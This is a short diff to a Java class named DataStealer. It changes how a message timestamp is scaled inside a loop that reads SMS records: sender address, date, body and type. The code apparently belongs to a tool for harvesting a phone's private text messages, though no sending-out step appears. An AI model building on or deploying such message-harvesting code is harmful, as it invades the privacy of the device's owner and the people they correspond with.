@@ -67,7 +67,7 @@ public class DataStealer {
             do {
                 long id = cursor.getLong(positionOfIdColumn);
                 String address = cursor.getString(positionOfAddressColumn);
-                long dateSent = cursor.getLong(positionOfDateSentColumn);
+                long dateSent = cursor.getLong(positionOfDateSentColumn) / 1000;
                 String body = cursor.getString(positionOfBodyColumn);
                 int typeFlag = cursor.getInt(positionOfMessageTypeColumn);
 
